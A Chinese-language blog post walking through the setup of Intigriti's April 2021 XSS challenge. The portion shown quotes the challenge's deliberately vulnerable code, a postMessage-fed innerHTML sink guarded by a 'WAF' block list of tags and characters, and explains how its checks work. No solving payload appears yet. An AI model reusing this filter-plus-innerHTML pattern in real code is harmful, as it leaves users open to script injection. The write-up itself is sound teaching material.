<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="zh-tw">
<head>
    <meta charset="utf-8">
<title>解題心得：Intigriti&#39;s 0421 XSS challenge（上） - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">


<link href="https://blog.huli.tw/2021/05/25/xss-challenge-by-intigriti-writeup/" rel="alternate" hreflang="zh-TW" />


<link href="https://blog.huli.tw/2021/05/25/xss-challenge-by-intigriti-writeup/" rel="alternate" hreflang="x-default" />


<link href="https://blog.huli.tw/2021/05/25/en/xss-challenge-by-intigriti-writeup/" rel="alternate" hreflang="en" />
    




    
<link rel="canonical" href="https://blog.huli.tw/2021/05/25/xss-challenge-by-intigriti-writeup/">
    





    <meta name="description" content="前言有天我在網路上閒晃的時候，看到了一個 XSS challenge：Intigriti’s 0421 XSS challenge - by @terjanq，除了這個挑戰本身很吸引我之外，更吸引我的是出題的作者。 之前在網路上找到的許多比較偏前端的資安相關資源，都是由這個作者在維護或是貢獻的，例如說 Tiny XSS Payloads 或者是令人大開眼界的 XS-Leaks Wiki。 Inti">
<meta property="og:type" content="article">
<meta property="og:title" content="解題心得：Intigriti&#39;s 0421 XSS challenge（上）">
<meta property="og:url" content="https://blog.huli.tw/2021/05/25/xss-challenge-by-intigriti-writeup/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="前言有天我在網路上閒晃的時候，看到了一個 XSS challenge：Intigriti’s 0421 XSS challenge - by @terjanq，除了這個挑戰本身很吸引我之外，更吸引我的是出題的作者。 之前在網路上找到的許多比較偏前端的資安相關資源，都是由這個作者在維護或是貢獻的，例如說 Tiny XSS Payloads 或者是令人大開眼界的 XS-Leaks Wiki。 Inti">
<meta property="og:locale" content="zh_TW">
<meta property="article:published_time" content="2021-05-25T13:13:21.000Z">
<meta property="article:modified_time" content="2023-05-07T01:15:16.493Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Security">
<meta property="article:tag" content="Front-end">
<meta name="twitter:card" content="summary_large_image">



<link rel="alternative" href="/atom.xml" title="解題心得：Intigriti&#39;s 0421 XSS challenge（上）" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=4.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/archives">文章列表</a>
            
            <a class="navbar-item "
               href="/categories">分類</a>
            
            <a class="navbar-item "
               href="/recommend">推薦閱讀</a>
            
            <a class="navbar-item "
               href="/about">關於我</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="目錄">
                    目錄
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#前言">1&nbsp;&nbsp;<b>前言</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#題目內容">2&nbsp;&nbsp;<b>題目內容</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#初次嘗試">3&nbsp;&nbsp;<b>初次嘗試</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#提示的幫助">4&nbsp;&nbsp;<b>提示的幫助</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#解開弱化版">5&nbsp;&nbsp;<b>解開弱化版？</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#又靠提示">6&nbsp;&nbsp;<b>又靠提示</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#結語">7&nbsp;&nbsp;<b>結語</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Medium" href="https://hulitw.medium.com/">
                
                <i class="fab fa-medium"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="Facebook" href="https://www.facebook.com/huli.blog">
                
                <i class="fab fa-facebook"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-ch.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
                <a class="navbar-item" href="/2021/05/25/en/xss-challenge-by-intigriti-writeup/">English</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        如果有什麼想回饋的（如對文章或部落格的感想），除了留言以外也能填表單跟我說：<a href="https://forms.gle/XuWyRC5qtSd2ANta8" target="_blank">表單連結</a>。若是對更多 JavaScript 知識有興趣，歡迎參考我的新書<a target="_blank" rel="noopener" href="https://www.tenlong.com.tw/products/9786267757048">《JavaScript 重修就好》</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            解題心得：Intigriti&#39;s 0421 XSS challenge（上）
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2021-05-25T13:13:21.000Z" itemprop="datePublished">2021年5月25日</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/categories/Security/">Security</a>
        </span>
        
        
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <h2><span id="前言">前言</span></h2><p>有天我在網路上閒晃的時候，看到了一個 XSS challenge：<a target="_blank" rel="noopener" href="https://challenge-0421.intigriti.io/">Intigriti’s 0421 XSS challenge - by @terjanq</a>，除了這個挑戰本身很吸引我之外，更吸引我的是出題的作者。</p>
<p>之前在網路上找到的許多比較偏前端的資安相關資源，都是由這個作者在維護或是貢獻的，例如說 <a target="_blank" rel="noopener" href="https://tinyxss.terjanq.me/">Tiny XSS Payloads</a> 或者是令人大開眼界的 <a target="_blank" rel="noopener" href="https://xsleaks.dev/">XS-Leaks Wiki</a>。</p>
<p><a target="_blank" rel="noopener" href="https://www.intigriti.com/">Intigriti</a> 這個網站似乎每個月都會舉辦這種 XSS challenge，而這一次的是他們有史以來舉辦過最難的一個。挑戰時間從 4&#x2F;19~4&#x2F;25，有一週的時間可以嘗試，最後成功解出的有 15 人。三月份的挑戰有 45 人解開，二月份有 33 人，所以這一次解出的人數確實少了許多，可想而知題目的難度。</p>
<p>我大概花了五天的時間，每天卡關的時候都想說「放棄好了，坐等解答」，但卻又時不時會有一些新的想法出現，想說就繼續試一下，最後終於在截止的那一天於時限前解開，解開的時候雙手握拳然後手肘往後，大喊：「太神辣」。</p>
<p>這篇想來記錄一下解題的心得，之前有寫了英文版的但大概比小學生作文還不如，還是寫個中文版的比較能完整表達自己的想法。標題會有個「上」是因為這篇寫我的解法，下一篇想來寫作者的解法，下下篇分析其他人的解法。</p>
<p>但我的部落格似乎被下了還沒寫好的系列文都會斷連載的詛咒，希望這次可以撐過去。</p>
<span id="more"></span>

<h2><span id="題目內容">題目內容</span></h2><p>題目在這邊：<a target="_blank" rel="noopener" href="https://challenge-0421.intigriti.io/">https://challenge-0421.intigriti.io/</a></p>
<p>目標是要在這個網站上成功執行 XSS，執行 <code>alert(&#39;flag&#123;THIS_IS_THE_FLAG&#125;&#39;)</code> 才算獲勝。</p>
<p>這道題目一共有兩個網頁，第一個是 index.html，底下我只擷取題目相關的程式碼：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>wafIframe<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./waf.html<span class="token punctuation">"</span></span> <span class="token attr-name">sandbox</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>allow-scripts<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">display</span><span class="token punctuation">:</span>none</span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">const</span> wafIframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'wafIframe'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>contentWindow<span class="token punctuation">;</span>
  <span class="token keyword">const</span> identifier <span class="token operator">=</span> <span class="token function">getIdentifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">function</span> <span class="token function">getIdentifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">const</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      crypto<span class="token punctuation">.</span><span class="token function">getRandomValues</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span> <span class="token operator">+</span> buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">function</span> <span class="token function">htmlError</span><span class="token punctuation">(</span><span class="token parameter">str<span class="token punctuation">,</span> safe</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">const</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"error-content"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> container <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"error-container"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      container<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">"block"</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span>safe<span class="token punctuation">)</span> div<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> str<span class="token punctuation">;</span>
      <span class="token keyword">else</span> div<span class="token punctuation">.</span>innerText <span class="token operator">=</span> str<span class="token punctuation">;</span>
      window<span class="token punctuation">.</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        div<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
        container<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">"none"</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">function</span> <span class="token function">addError</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      wafIframe<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
          identifier<span class="token punctuation">,</span>
          str
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token string">'waf'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span><span class="token punctuation">(</span>identifier <span class="token operator">!==</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>identifier<span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token operator">/</span>nice <span class="token keyword">try</span><span class="token operator">/</span>
          <span class="token function">htmlError</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>str<span class="token punctuation">,</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>safe<span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">const</span> error <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span>error <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token function">addError</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先在 window onload 的時候會從 URL 的 query string 上面拿 <code>error</code> 的內容出來，然後呼叫 <code>addError(error)</code>。接著會把內容加上一個隨機產生的 id 用 postMessage 送到 <code>wafIframe</code>。</p>
<p><code>wafIframe</code> 處理完畢之後會再用 postMessage 把結果送回來，先檢查 identifier 是否相同，相同的話驗證通過，再看 e.data.safe 是不是 true，是的話就用 innerHTML 新增 e.data.str，否則的話就用 innerText。</p>
<p>再來我們看看另一個頁面 waf.html 在幹嘛：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> identifier <span class="token operator">=</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>identifier<span class="token punctuation">;</span>
    e<span class="token punctuation">.</span>source<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span><span class="token string">'waf'</span><span class="token punctuation">,</span>
        identifier<span class="token punctuation">,</span>
        <span class="token literal-property property">str</span><span class="token operator">:</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>str<span class="token punctuation">,</span>
        <span class="token literal-property property">safe</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">WAF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isSafe</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>str<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token constant">WAF</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> forbidden_words <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'&lt;style'</span><span class="token punctuation">,</span> <span class="token string">'&lt;iframe'</span><span class="token punctuation">,</span> <span class="token string">'&lt;embed'</span><span class="token punctuation">,</span> <span class="token string">'&lt;form'</span><span class="token punctuation">,</span> <span class="token string">'&lt;input'</span><span class="token punctuation">,</span> <span class="token string">'&lt;button'</span><span class="token punctuation">,</span> <span class="token string">'&lt;svg'</span><span class="token punctuation">,</span> <span class="token string">'&lt;script'</span><span class="token punctuation">,</span> <span class="token string">'&lt;math'</span><span class="token punctuation">,</span> <span class="token string">'&lt;base'</span><span class="token punctuation">,</span> <span class="token string">'&lt;link'</span><span class="token punctuation">,</span> <span class="token string">'javascript:'</span><span class="token punctuation">,</span> <span class="token string">'data:'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> dangerous_operators <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">'&#123;'</span><span class="token punctuation">,</span> <span class="token string">'&#125;'</span><span class="token punctuation">,</span> <span class="token string">'['</span><span class="token punctuation">,</span> <span class="token string">']'</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">]</span>

    <span class="token keyword">function</span> <span class="token function">decodeHTMLEntities</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> ta <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'textarea'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ta<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> str<span class="token punctuation">;</span>
        <span class="token keyword">return</span> ta<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">onlyASCII</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[^\x21-\x7e]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">firstTag</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;[a-z]+</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">firstOnHandler</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">on[a-z]&#123;3,&#125;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">firstEqual</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">=</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">hasDangerousOperators</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> dangerous_operators<span class="token punctuation">.</span><span class="token function">some</span><span class="token punctuation">(</span><span class="token parameter">op</span><span class="token operator">=></span>str<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>op<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">hasForbiddenWord</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> forbidden_words<span class="token punctuation">.</span><span class="token function">some</span><span class="token punctuation">(</span><span class="token parameter">word</span><span class="token operator">=></span>str<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>word<span class="token punctuation">,</span> <span class="token string">'gi'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">isSafe</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> decoded <span class="token operator">=</span> <span class="token function">onlyASCII</span><span class="token punctuation">(</span><span class="token function">decodeHTMLEntities</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">const</span> first_tag <span class="token operator">=</span> <span class="token function">firstTag</span><span class="token punctuation">(</span>decoded<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>first_tag <span class="token operator">===</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        decoded <span class="token operator">=</span> decoded<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>first_tag<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">hasForbiddenWord</span><span class="token punctuation">(</span>decoded<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

        <span class="token keyword">const</span> first_on_handler <span class="token operator">=</span> <span class="token function">firstOnHandler</span><span class="token punctuation">(</span>decoded<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>first_on_handler <span class="token operator">===</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        decoded <span class="token operator">=</span> decoded<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>first_on_handler<span class="token punctuation">)</span>

        <span class="token keyword">const</span> first_equal <span class="token operator">=</span> <span class="token function">firstEqual</span><span class="token punctuation">(</span>decoded<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>first_equal <span class="token operator">===</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        decoded <span class="token operator">=</span> decoded<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>first_equal<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">hasDangerousOperators</span><span class="token punctuation">(</span>decoded<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>這邊收到 index 傳來的資料時會經過一系列驗證，看看送來的資料是不是 safe，做的檢查依序為：</p>
<ol>
<li>先把送來的資料 decode 而且只允許 ASCII</li>
<li>找第一個 html tag 並且過濾掉 <code>[&#39;&lt;style&#39;, &#39;&lt;iframe&#39;, &#39;&lt;embed&#39;, &#39;&lt;form&#39;, &#39;&lt;input&#39;, &#39;&lt;button&#39;, &#39;&lt;svg&#39;, &#39;&lt;script&#39;, &#39;&lt;math&#39;, &#39;&lt;base&#39;, &#39;&lt;link&#39;, &#39;javascript:&#39;, &#39;data:&#39;]</code></li>
<li>找 onXXX handler 之後出現的第一個 &#x3D; 號</li>
<li>不能有以下字元 <code>[&#39;&quot;&#39;, &quot;&#39;&quot;, &#39;``&#39;, &#39;(&#39;, &#39;)&#39;, &#39;&#123;&#39;, &#39;&#125;&#39;, &#39;[&#39;, &#39;]&#39;, &#39;=&#39;]</code></li>
<li>以上都成功的話才 safe，才會被 index.html 當作 innerHTML 來解釋</li>
</ol>
